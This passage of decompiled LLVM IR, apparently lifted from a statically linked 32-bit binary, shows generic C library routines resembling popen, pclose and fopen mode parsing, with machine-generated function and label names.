  br i1 %v5_804b8bb, label %dec_label_pc_804b8cf, label %dec_label_pc_804b8c1

dec_label_pc_804b8c1:                             ; preds = %dec_label_pc_804b8bb
  %v1_804b8c4 = add i32 %v0_804b8bb, 8
  %v2_804b8c4 = inttoptr i32 %v1_804b8c4 to i32*
  %v3_804b8c4 = load i32, i32* %v2_804b8c4, align 4
  %v1_804b8c7 = call i32 @function_804e481(i32 %v3_804b8c4)
  store i32 %v1_804b8c7, i32* @eax, align 4
  br label %dec_label_pc_804b8cf

dec_label_pc_804b8cf:                             ; preds = %dec_label_pc_804b8bb, %dec_label_pc_804b8c1
  %v2_804b8db = call i32 @function_804f016(i32 %v2_804b861, i32 134541331)
  %v1_804b8e7 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b78.107 to i32))
  store i32 ptrtoint (i32* @global_var_8055b78.107 to i32), i32* @eax, align 4
  %v0_804b8ed = load i32, i32* @global_var_8056244.109, align 4
  %v1_804b8ed = add i32 %v0_804b8ed, 1
  store i32 %v1_804b8ed, i32* @global_var_8056244.109, align 4
  %v2_804b8f7 = call i32 @function_804f016(i32 %v2_804b861, i32 1)
  %v0_804b8fc = call i32 @function_804cda0()
  %v0_804b904 = load i32, i32* @edi, align 4
  store i32 %v0_804b7ff, i32* @ebx, align 4
  store i32 %v0_804b7fe, i32* @esi, align 4
  store i32 %v0_804b7fd, i32* @edi, align 4
  store i32 %v0_804b7fc, i32* @ebp, align 4
  ret i32 %v0_804b904

; uselistorder directives
  uselistorder i32 %v2_804b861, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_804b8cf, { 1, 0 }
  uselistorder label %dec_label_pc_804b8bb, { 1, 0 }
  uselistorder label %dec_label_pc_804b842, { 1, 0 }
  uselistorder label %dec_label_pc_804b82d, { 1, 0 }
}

define i32 @function_804b90c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b90c:
  %v4_804b91b = inttoptr i32 %arg2 to i8*
  %v5_804b91b = call i32 @function_804bcc8(i32 %arg1, i8* %v4_804b91b, i32 0, i32 -1)
  ret i32 %v5_804b91b
}

define i32 @function_804b924(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b924:
  %v4_804b935 = inttoptr i32 %arg1 to i8*
  %v5_804b935 = call i32 @function_804b960(i8* %v4_804b935, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_804b935
}

define i32 @function_804b940(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b940:
  %stack_var_12 = alloca i32, align 4
  %v2_804b943 = ptrtoint i32* %stack_var_12 to i32
  %v4_804b956 = inttoptr i32 %arg1 to i8*
  %v5_804b956 = call i32 @function_804b960(i8* %v4_804b956, i32 -1, i32 %arg2, i32 %v2_804b943)
  ret i32 %v5_804b956
}

define i32 @function_804b960(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b960:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b960 = load i32, i32* @ebp, align 4
  %v0_804b961 = load i32, i32* @edi, align 4
  %v0_804b962 = load i32, i32* @esi, align 4
  %v0_804b963 = load i32, i32* @ebx, align 4
  store i32 %v0_804b963, i32* %stack_var_-16, align 4
  %v4_804b967 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804b967, i32* @esi, align 4
  %v2_804b96b = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804b976 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804b976, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804b990 = sub i32 -1, %v4_804b967
  %v1_804b9a3 = call i32 @function_804bf6f(i32 %v2_804b96b)
  %v1_804b9b3 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804b990, %v1_804b9b3
  %v5_804b9b5 = select i1 %tmp, i32 %v1_804b990, i32 %v1_804b9b3
  store i32 %v5_804b9b5, i32* @ebx, align 4
  %v0_804b9b8 = load i32, i32* @esi, align 4
  %v3_804b9e2 = inttoptr i32 %arg3 to i8*
  %v4_804b9e2 = call i32 @function_804c0dc(i32 %v2_804b976, i8* %v3_804b9e2, i32 %arg4)
  %v1_804b9ea = icmp eq i32 %v5_804b9b5, 0
  store i32 %v4_804b9e2, i32* %edx.global-to-local, align 4
  br i1 %v1_804b9ea, label %dec_label_pc_804ba06, label %dec_label_pc_804b9ff

dec_label_pc_804b9ff:                             ; preds = %dec_label_pc_804b960
  %stack_var_-80.0 = inttoptr i32 %v0_804b9b8 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804ba09.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ba06

dec_label_pc_804ba06:                             ; preds = %dec_label_pc_804b960, %dec_label_pc_804b9ff
  %v0_804ba09 = phi i32 [ %v4_804b9e2, %dec_label_pc_804b960 ], [ %v0_804ba09.pre, %dec_label_pc_804b9ff ]
  %v2_804ba0b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ba0b, i32* @ebx, align 4
  store i32 %v0_804b962, i32* @esi, align 4
  store i32 %v0_804b961, i32* @edi, align 4
  store i32 %v0_804b960, i32* @ebp, align 4
  ret i32 %v0_804ba09

; uselistorder directives
  uselistorder i32 %v1_804b9b3, { 1, 0 }
  uselistorder i32 %v1_804b990, { 1, 0 }
  uselistorder label %dec_label_pc_804ba06, { 1, 0 }
}

define i32 @function_804ba10(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ba10:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_804ba24 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ba24, i32* @eax, align 4
  store i32 %v2_804ba24, i32* %stack_var_-60, align 4
  %v2_804ba29 = call i32 @function_804f016(i32 %v2_804ba24, i32 134541331)
  store i32 ptrtoint (i32* @global_var_8056224.110 to i32), i32* %stack_var_-60, align 4
  %v1_804ba35 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8056224.110 to i32))
  %v0_804ba3a = load i32, i32* @global_var_805623c.111, align 4
  store i32 %v0_804ba3a, i32* @ebx, align 4
  %v1_804ba43 = icmp eq i32 %v0_804ba3a, 0
  br i1 %v1_804ba43, label %dec_label_pc_804ba79, label %dec_label_pc_804ba47

dec_label_pc_804ba47:                             ; preds = %dec_label_pc_804ba10
  %v1_804ba47 = add i32 %v0_804ba3a, 4
  %v2_804ba47 = inttoptr i32 %v1_804ba47 to i32*
  %v3_804ba47 = load i32, i32* %v2_804ba47, align 4
  %v4_804ba47 = load i32, i32* @edi, align 4
  %v15_804ba47 = icmp eq i32 %v3_804ba47, %v4_804ba47
  %v1_804ba4a = icmp eq i1 %v15_804ba47, false
  br i1 %v1_804ba4a, label %dec_label_pc_804ba68, label %dec_label_pc_804ba4c

dec_label_pc_804ba4c:                             ; preds = %dec_label_pc_804ba47
  %v1_804ba4c = inttoptr i32 %v0_804ba3a to i32*
  %v2_804ba4c = load i32, i32* %v1_804ba4c, align 4
  store i32 %v2_804ba4c, i32* @global_var_805623c.111, align 4
  br label %dec_label_pc_804ba79

dec_label_pc_804ba55:                             ; preds = %dec_label_pc_804ba68
  %v0_804ba55 = load i32, i32* %stack_var_-60, align 4
  %v1_804ba55 = call i32 @function_804b7f4(i32 %v0_804ba55)
  %v1_804ba5a = inttoptr i32 %v1_804ba55 to i32*
  store i32 22, i32* %v1_804ba5a, align 4
  br label %dec_label_pc_804ba79

dec_label_pc_804ba62:                             ; preds = %dec_label_pc_804baa5
  %v3_804ba62 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804bac7

dec_label_pc_804ba68:                             ; preds = %dec_label_pc_804ba47, %dec_label_pc_804ba70
  %v1_804ba77 = phi i32 [ %v2_804ba6a, %dec_label_pc_804ba70 ], [ %v0_804ba3a, %dec_label_pc_804ba47 ]
  %v1_804ba6a = inttoptr i32 %v1_804ba77 to i32*
  %v2_804ba6a = load i32, i32* %v1_804ba6a, align 4
  store i32 %v2_804ba6a, i32* @ebx, align 4
  %v1_804ba6c = icmp eq i32 %v2_804ba6a, 0
  br i1 %v1_804ba6c, label %dec_label_pc_804ba55, label %dec_label_pc_804ba70

dec_label_pc_804ba70:                             ; preds = %dec_label_pc_804ba68
  %v1_804ba70 = add i32 %v2_804ba6a, 4
  %v2_804ba70 = inttoptr i32 %v1_804ba70 to i32*
  %v3_804ba70 = load i32, i32* %v2_804ba70, align 4
  %v15_804ba70 = icmp eq i32 %v3_804ba70, %v4_804ba47
  %v1_804ba73 = icmp eq i1 %v15_804ba70, false
  br i1 %v1_804ba73, label %dec_label_pc_804ba68, label %dec_label_pc_804ba75

dec_label_pc_804ba75:                             ; preds = %dec_label_pc_804ba70
  %v1_804ba75 = inttoptr i32 %v2_804ba6a to i32*
  %v2_804ba75 = load i32, i32* %v1_804ba75, align 4
  store i32 %v2_804ba75, i32* %v1_804ba6a, align 4
  br label %dec_label_pc_804ba79

dec_label_pc_804ba79:                             ; preds = %dec_label_pc_804ba10, %dec_label_pc_804ba55, %dec_label_pc_804ba4c, %dec_label_pc_804ba75
  store i32 %v2_804ba24, i32* @eax, align 4
  store i32 %v2_804ba24, i32* %stack_var_-60, align 4
  %v2_804ba82 = call i32 @function_804f016(i32 %v2_804ba24, i32 1)
  %v0_804ba8a = load i32, i32* @ebx, align 4
  %v1_804ba8a = icmp eq i32 %v0_804ba8a, 0
  br i1 %v1_804ba8a, label %dec_label_pc_804bac4, label %dec_label_pc_804ba8e

dec_label_pc_804ba8e:                             ; preds = %dec_label_pc_804ba79
  %v1_804ba91 = add i32 %v0_804ba8a, 8
  %v2_804ba91 = inttoptr i32 %v1_804ba91 to i32*
  %v3_804ba91 = load i32, i32* %v2_804ba91, align 4
  store i32 %v3_804ba91, i32* @esi, align 4
  store i32 %v0_804ba8a, i32* %stack_var_-60, align 4
  %v1_804ba95 = call i32 @function_804e481(i32 %v0_804ba8a)
  store i32 %v1_804ba95, i32* @eax, align 4
  %v0_804ba9a = load i32, i32* @edi, align 4
  store i32 %v0_804ba9a, i32* %stack_var_-60, align 4
  %v1_804ba9d = inttoptr i32 %v0_804ba9a to i16*
  %v2_804ba9d = call i32 @function_804b7fc(i16* %v1_804ba9d)
  %v2_804baa8 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_804baa5

dec_label_pc_804baa5:                             ; preds = %dec_label_pc_804baba, %dec_label_pc_804ba8e
  %v0_804baa5 = phi i32 [ %v1_804baba, %dec_label_pc_804baba ], [ %v2_804ba9d, %dec_label_pc_804ba8e ]
  %v0_804baad = load i32, i32* @esi, align 4
  store i32 %v0_804baad, i32* %stack_var_-60, align 4
  %v4_804baae = call i32 @function_804b780(i32 %v0_804baad, i32 %v2_804baa8, i32 0, i32 %v0_804baa5)
  %v2_804bab6 = icmp slt i32 %v4_804baae, 0
  %v1_804bab8 = icmp eq i1 %v2_804bab6, false
  br i1 %v1_804bab8, label %dec_label_pc_804ba62, label %dec_label_pc_804baba

dec_label_pc_804baba:                             ; preds = %dec_label_pc_804baa5
  %v0_804baba = load i32, i32* %stack_var_-60, align 4
  %v1_804baba = call i32 @function_804b7f4(i32 %v0_804baba)
  %v1_804babf = inttoptr i32 %v1_804baba to i32*
  %v2_804babf = load i32, i32* %v1_804babf, align 4
  %v11_804babf = icmp eq i32 %v2_804babf, 4
  br i1 %v11_804babf, label %dec_label_pc_804baa5, label %dec_label_pc_804bac4.loopexit

dec_label_pc_804bac4.loopexit:                    ; preds = %dec_label_pc_804baba
  br label %dec_label_pc_804bac4

dec_label_pc_804bac4:                             ; preds = %dec_label_pc_804bac4.loopexit, %dec_label_pc_804ba79
  br label %dec_label_pc_804bac7

dec_label_pc_804bac7:                             ; preds = %dec_label_pc_804ba62, %dec_label_pc_804bac4
  %storemerge = phi i32 [ -1, %dec_label_pc_804bac4 ], [ %v3_804ba62, %dec_label_pc_804ba62 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804baba, { 1, 0 }
  uselistorder i32 %v0_804ba8a, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804ba6a, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_804ba24, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_804bac7, { 1, 0 }
  uselistorder label %dec_label_pc_804ba79, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804ba68, { 1, 0 }
}

define i32 @function_804bace(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804bace:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v15_804bad0 = ptrtoint i32* %stack_var_-60 to i32
  %v4_804bad3 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804bad3, i32* @ebx, align 4
  %v2_804bad7 = load i8, i8* %arg2, align 1
  %v10_804bad9 = icmp eq i8 %v2_804bad7, 119
  br i1 %v10_804bad9, label %dec_label_pc_804bb08, label %dec_label_pc_804badd

dec_label_pc_804badd:                             ; preds = %dec_label_pc_804bace
  %v10_804badd = icmp eq i8 %v2_804bad7, 114
  br i1 %v10_804badd, label %dec_label_pc_804bb08, label %dec_label_pc_804bae9

dec_label_pc_804bae9:                             ; preds = %dec_label_pc_804badd
  %v1_804bae9 = call i32 @function_804b7f4(i32 1)
  %v1_804baee = inttoptr i32 %v1_804bae9 to i32*
  store i32 22, i32* %v1_804baee, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bcbf

dec_label_pc_804bb08:                             ; preds = %dec_label_pc_804bace, %dec_label_pc_804badd
  %v0_804bbd6 = phi i32 [ 1, %dec_label_pc_804badd ], [ 0, %dec_label_pc_804bace ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_804bb0d = call i32 @function_804daaa(i32 12)
  %v1_804bb19 = icmp eq i32 %v1_804bb0d, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_804bb19, label %dec_label_pc_804bcbf, label %dec_label_pc_804bb28

dec_label_pc_804bb28:                             ; preds = %dec_label_pc_804bb08
  %v2_804bb2b = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_804bb2b, i32* %stack_var_-76, align 4
  %v1_804bb30 = call i32 @function_804f714(i32 %v2_804bb2b)
  %v1_804bb38 = icmp eq i32 %v1_804bb30, 0
  %v1_804bb3a = icmp eq i1 %v1_804bb38, false
  br i1 %v1_804bb3a, label %dec_label_pc_804bca8, label %dec_label_pc_804bb40

dec_label_pc_804bb40:                             ; preds = %dec_label_pc_804bb28
  %tmp39 = sub nsw i32 0, %v0_804bbd6
  %v2_804bb44 = and i32 %tmp39, 4
  %v3_804bb44 = add i32 %v15_804bad0, 44
  %v4_804bb44 = add i32 %v3_804bb44, %v2_804bb44
  %v5_804bb44 = inttoptr i32 %v4_804bb44 to i32*
  %v6_804bb44 = load i32, i32* %v5_804bb44, align 4
  %v5_804bb51 = xor i32 %v0_804bbd6, 1
  %tmp40 = sub nsw i32 0, %v5_804bb51
  %v2_804bb55 = and i32 %tmp40, 4
  %v4_804bb55 = add i32 %v3_804bb44, %v2_804bb55
  %v5_804bb55 = inttoptr i32 %v4_804bb55 to i32*
  %v6_804bb55 = load i32, i32* %v5_804bb55, align 4
  %v0_804bb5d = load i32, i32* @ecx, align 4
  %v0_804bb5f = load i32, i32* @ebx, align 4
  store i32 %v6_804bb55, i32* %stack_var_-76, align 4
  %v5_804bb61 = call i32 @function_804f920(i32 %v6_804bb55, i32 %v0_804bb5f, i32 %v0_804bb5d, i32 %v0_804bb5d)
  store i32 %v5_804bb61, i32* %stack_var_-60, align 4
  %v1_804bb6d = icmp eq i32 %v5_804bb61, 0
  %v1_804bb6f = icmp eq i1 %v1_804bb6d, false
  br i1 %v1_804bb6f, label %dec_label_pc_804bb8c, label %dec_label_pc_804bb71

dec_label_pc_804bb71:                             ; preds = %dec_label_pc_804bb40
  store i32 %v6_804bb55, i32* %stack_var_-76, align 4
  %v1_804bb78 = call i32 @function_804b5f4(i32 %v6_804bb55)
  %v2_804bb7d = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804bb7d, i32* %edx.global-to-local, align 4
  store i32 %v6_804bb44, i32* %stack_var_-76, align 4
  %v1_804bb82 = call i32 @function_804b5f4(i32 %v6_804bb44)
  br label %dec_label_pc_804bca5

dec_label_pc_804bb8c:                             ; preds = %dec_label_pc_804bb40
  %v2_804bb97 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bb97, i32* @eax, align 4
  store i32 %v2_804bb97, i32* %stack_var_-76, align 4
  %v3_804bb9c = call i32 @function_804f016(i32 %v2_804bb97, i32 134541331)
  store i32 ptrtoint (i32* @global_var_8056224.110 to i32), i32* %stack_var_-76, align 4
  %v1_804bba8 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8056224.110 to i32))
  %v0_804bbad = call i32 @function_804f334()
  store i32 %v0_804bbad, i32* @eax, align 4
  %v1_804bbb5 = icmp eq i32 %v0_804bbad, 0
  store i32 %v0_804bbad, i32* @ebx, align 4
  %v1_804bbb9 = icmp eq i1 %v1_804bbb5, false
  br i1 %v1_804bbb9, label %dec_label_pc_804bc33, label %dec_label_pc_804bbbb

dec_label_pc_804bbbb:                             ; preds = %dec_label_pc_804bb8c
  store i32 %v6_804bb55, i32* %stack_var_-76, align 4
  %v1_804bbc2 = call i32 @function_804b5f4(i32 %v6_804bb55)
  store i32 %v0_804bbd6, i32* %edx.global-to-local, align 4
  %v15_804bbce = icmp eq i32 %v6_804bb44, %v0_804bbd6
  br i1 %v15_804bbce, label %dec_label_pc_804bbed, label %dec_label_pc_804bbd4

dec_label_pc_804bbd4:                             ; preds = %dec_label_pc_804bbbb
  store i32 %v6_804bb44, i32* %stack_var_-76, align 4
  %v5_804bbdb = call i32 @function_804f4cc(i32 %v6_804bb44, i32 %v0_804bbd6, i32 %v1_804bbc2, i32 %v1_804bbc2)
  store i32 %v6_804bb44, i32* %stack_var_-76, align 4
  %v1_804bbe5 = call i32 @function_804b5f4(i32 %v6_804bb44)
  br label %dec_label_pc_804bbed

dec_label_pc_804bbed:                             ; preds = %dec_label_pc_804bbbb, %dec_label_pc_804bbd4
  %v0_804bbed = load i32, i32* @global_var_805623c.111, align 4
  store i32 %v0_804bbed, i32* @ebx, align 4
  %v1_804bc084 = icmp eq i32 %v0_804bbed, 0
  %v1_804bc0a11 = icmp eq i1 %v1_804bc084, false
  br i1 %v1_804bc0a11, label %dec_label_pc_804bbf5, label %dec_label_pc_804bc0c

dec_label_pc_804bbf5:                             ; preds = %dec_label_pc_804bbed, %dec_label_pc_804bbf5
  %v0_804bbf5 = phi i32 [ %v2_804bc03, %dec_label_pc_804bbf5 ], [ %v0_804bbed, %dec_label_pc_804bbed ]
  %v1_804bbf5 = add i32 %v0_804bbf5, 4
  %v2_804bbf5 = inttoptr i32 %v1_804bbf5 to i32*
  %v3_804bbf5 = load i32, i32* %v2_804bbf5, align 4
  %v1_804bbfb = add i32 %v3_804bbf5, 4
  %v2_804bbfb = inttoptr i32 %v1_804bbfb to i32*
  %v3_804bbfb = load i32, i32* %v2_804bbfb, align 4
  store i32 %v3_804bbfb, i32* %stack_var_-76, align 4
  %v1_804bbfe = call i32 @function_804b5f4(i32 %v3_804bbfb)
  %v0_804bc03 = load i32, i32* @ebx, align 4
  %v1_804bc03 = inttoptr i32 %v0_804bc03 to i32*
  %v2_804bc03 = load i32, i32* %v1_804bc03, align 4
  store i32 %v2_804bc03, i32* @ebx, align 4
  %v1_804bc08 = icmp eq i32 %v2_804bc03, 0
  %v1_804bc0a = icmp eq i1 %v1_804bc08, false
  br i1 %v1_804bc0a, label %dec_label_pc_804bbf5, label %dec_label_pc_804bc0c

dec_label_pc_804bc0c:                             ; preds = %dec_label_pc_804bbf5, %dec_label_pc_804bbed
  store i32 0, i32* %stack_var_-76, align 4
  %v8_804bc24 = call i32 @function_804ec94(i32 ptrtoint ([8 x i8]* @global_var_80533c3.114 to i32), i32 ptrtoint ([3 x i8]* @global_var_80533c8.113 to i32), i32 ptrtoint ([3 x i8]* @global_var_80533c0.112 to i32), i32 %arg1, i32 0)
  store i32 127, i32* %stack_var_-76, align 4
  %v1_804bc2e = call i32 @function_804f470(i32 127)
  unreachable

dec_label_pc_804bc33:                             ; preds = %dec_label_pc_804bb8c
  store i32 %v2_804bb97, i32* @esi, align 4
  store i32 %v2_804bb97, i32* %stack_var_-76, align 4
  %v3_804bc3c = call i32 @function_804f016(i32 %v2_804bb97, i32 1)
  store i32 %v6_804bb44, i32* %stack_var_-76, align 4
  %v1_804bc46 = call i32 @function_804b5f4(i32 %v6_804bb44)
  store i32 %v1_804bc46, i32* @eax, align 4
  %v0_804bc4e = load i32, i32* @ebx, align 4
  %tmp42 = icmp slt i32 %v0_804bc4e, 1
  br i1 %tmp42, label %dec_label_pc_804bc99, label %dec_label_pc_804bc52

dec_label_pc_804bc52:                             ; preds = %dec_label_pc_804bc33
  store i32 %v1_804bb0d, i32* @eax, align 4
  %v2_804bc56 = add i32 %v1_804bb0d, 8
  %v3_804bc56 = inttoptr i32 %v2_804bc56 to i32*
  store i32 %v0_804bc4e, i32* %v3_804bc56, align 4
  %v2_804bc59 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_804bc59, i32* %edx.global-to-local, align 4
  %v1_804bc5c = load i32, i32* @eax, align 4
  %v2_804bc5c = add i32 %v1_804bc5c, 4
  %v3_804bc5c = inttoptr i32 %v2_804bc5c to i32*
  store i32 %v2_804bc59, i32* %v3_804bc5c, align 4
  store i32 %v2_804bb97, i32* %stack_var_-76, align 4
  %v3_804bc6b = call i32 @function_804f016(i32 %v2_804bb97, i32 134541331)
  store i32 ptrtoint (i32* @global_var_8056224.110 to i32), i32* %stack_var_-76, align 4
  %v1_804bc77 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8056224.110 to i32))
  store i32 %v1_804bb0d, i32* %edx.global-to-local, align 4
  %v0_804bc80 = load i32, i32* @global_var_805623c.111, align 4
  store i32 %v0_804bc80, i32* @eax, align 4
  %v2_804bc85 = inttoptr i32 %v1_804bb0d to i32*
  store i32 %v0_804bc80, i32* %v2_804bc85, align 4
  %v0_804bc88 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804bc88, i32* @global_var_805623c.111, align 4
  store i32 %v2_804bb97, i32* %stack_var_-76, align 4
  %v3_804bc92 = call i32 @function_804f016(i32 %v2_804bb97, i32 1)
  %v2_804bcbf.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bcbc

dec_label_pc_804bc99:                             ; preds = %dec_label_pc_804bc33
  %v3_804bc9c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_804bc9c, i32* %stack_var_-76, align 4
  %v1_804bca0 = inttoptr i32 %v3_804bc9c to i16*
  %v2_804bca0 = call i32 @function_804b7fc(i16* %v1_804bca0)
  br label %dec_label_pc_804bca5

dec_label_pc_804bca5:                             ; preds = %dec_label_pc_804bb71, %dec_label_pc_804bc99
  br label %dec_label_pc_804bca8

dec_label_pc_804bca8:                             ; preds = %dec_label_pc_804bb28, %dec_label_pc_804bca5
  store i32 %v1_804bb0d, i32* %stack_var_-76, align 4
  %v1_804bcaf = call i32 @function_804e481(i32 %v1_804bb0d)
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bcbc

dec_label_pc_804bcbc:                             ; preds = %dec_label_pc_804bc52, %dec_label_pc_804bca8
  %v2_804bcbf.pre = phi i32 [ %v2_804bcbf.pre.pre, %dec_label_pc_804bc52 ], [ 0, %dec_label_pc_804bca8 ]
  br label %dec_label_pc_804bcbf

dec_label_pc_804bcbf:                             ; preds = %dec_label_pc_804bb08, %dec_label_pc_804bae9, %dec_label_pc_804bcbc
  %v2_804bcbf = phi i32 [ 0, %dec_label_pc_804bb08 ], [ 0, %dec_label_pc_804bae9 ], [ %v2_804bcbf.pre, %dec_label_pc_804bcbc ]
  ret i32 %v2_804bcbf

; uselistorder directives
  uselistorder i32 %v0_804bc4e, { 1, 0 }
  uselistorder i32 %v2_804bc03, { 1, 2, 0 }
  uselistorder i32 %v2_804bb97, { 1, 0, 3, 2, 5, 4, 6, 8, 7, 9 }
  uselistorder i32 %v6_804bb55, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_804bb44, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_804bb2b, { 1, 0 }
  uselistorder i32 %v1_804bb0d, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32 %v0_804bbd6, { 1, 0, 4, 2, 3 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_8056224.110 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bcbf, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bcbc, { 1, 0 }
  uselistorder label %dec_label_pc_804bca8, { 1, 0 }
  uselistorder label %dec_label_pc_804bca5, { 1, 0 }
  uselistorder label %dec_label_pc_804bbf5, { 1, 0 }
  uselistorder label %dec_label_pc_804bbed, { 1, 0 }
  uselistorder label %dec_label_pc_804bb08, { 1, 0 }
}

define i32 @function_804bcc8(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804bcc8:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bcc8 = load i32, i32* @ebp, align 4
  %v0_804bcc9 = load i32, i32* @edi, align 4
  %v0_804bcca = load i32, i32* @esi, align 4
  %v0_804bccb = load i32, i32* @ebx, align 4
  store i32 %v0_804bccb, i32* %stack_var_-16, align 4
  %v4_804bccf = ptrtoint i8* %arg2 to i32
  store i32 %v4_804bccf, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804bcdf = load i8, i8* %arg2, align 1
  %v3_804bcdf = zext i8 %v2_804bcdf to i32
  %v4_804bcdf = load i32, i32* @eax, align 4
  %v5_804bcdf = and i32 %v4_804bcdf, -256
  %v6_804bcdf = or i32 %v5_804bcdf, %v3_804bcdf
  store i32 %v6_804bcdf, i32* %eax.global-to-local, align 4
  %v10_804bce1 = icmp eq i8 %v2_804bcdf, 114
  br i1 %v10_804bce1, label %dec_label_pc_804bd23, label %dec_label_pc_804bce5

dec_label_pc_804bce5:                             ; preds = %dec_label_pc_804bcc8
  %v10_804bce5 = icmp eq i8 %v2_804bcdf, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804bce5, label %dec_label_pc_804bd25, label %dec_label_pc_804bcee

dec_label_pc_804bcee:                             ; preds = %dec_label_pc_804bce5
  %v10_804bcee = icmp eq i8 %v2_804bcdf, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804bcee, label %dec_label_pc_804bd25, label %dec_label_pc_804bcf6

dec_label_pc_804bcf6:                             ; preds = %dec_label_pc_804bd9e, %dec_label_pc_804bd78, %dec_label_pc_804bcee
  %v0_804bcf6 = load i32, i32* %stack_var_-16, align 4
  %v1_804bcf6 = call i32 @function_804b7f4(i32 %v0_804bcf6)
  store i32 %v1_804bcf6, i32* %eax.global-to-local, align 4
  %v0_804bcfb = load i32, i32* @ebp, align 4
  %v1_804bcfb = icmp eq i32 %v0_804bcfb, 0
  %v1_804bcfd = inttoptr i32 %v1_804bcf6 to i32*
  store i32 22, i32* %v1_804bcfd, align 4
  br i1 %v1_804bcfb, label %dec_label_pc_804beff, label %dec_label_pc_804bd09

dec_label_pc_804bd09:                             ; preds = %dec_label_pc_804bdc1, %dec_label_pc_804bcf6
  %v0_804bd09 = load i32, i32* @ebp, align 4
  %v1_804bd09 = add i32 %v0_804bd09, 1
  %v2_804bd09 = inttoptr i32 %v1_804bd09 to i8*
  %v3_804bd09 = load i8, i8* %v2_804bd09, align 1
  %v4_804bd09 = and i8 %v3_804bd09, 32
  %v5_804bd09 = icmp eq i8 %v4_804bd09, 0
  br i1 %v5_804bd09, label %dec_label_pc_804beff, label %dec_label_pc_804bd13

dec_label_pc_804bd13:                             ; preds = %dec_label_pc_804bd09
  store i32 %v0_804bd09, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804bd19 = call i32 @function_804e481(i32 %v0_804bd09)
  br label %dec_label_pc_804befa

dec_label_pc_804bd23:                             ; preds = %dec_label_pc_804bcc8
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804bd25

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bcee, %dec_label_pc_804bce5, %dec_label_pc_804bd23
  %v0_804bd36 = phi i32 [ 1089, %dec_label_pc_804bcee ], [ 577, %dec_label_pc_804bce5 ], [ 0, %dec_label_pc_804bd23 ]
  %v1_804bd25 = add i32 %v4_804bccf, 1
  %v2_804bd25 = inttoptr i32 %v1_804bd25 to i8*
